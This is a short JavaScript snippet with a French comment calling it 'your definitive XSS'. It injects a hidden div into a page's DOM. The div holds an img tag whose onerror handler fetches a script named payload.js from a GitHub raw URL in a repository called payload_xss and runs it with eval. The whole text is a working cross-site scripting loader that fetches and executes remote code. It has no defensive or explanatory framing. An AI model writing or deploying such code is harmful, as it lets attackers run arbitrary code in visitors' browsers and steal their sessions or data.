// Crée un champ caché dans le DOM avec ta XSS définitive
let hiddenDiv = document.createElement('div');
hiddenDiv.style.display = 'none';
hiddenDiv.innerHTML = `<img src=x onerror="fetch('https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/payload.js').then(r=>r.text()).then(c=>eval(c))">`;

document.body.appendChild(hiddenDiv);
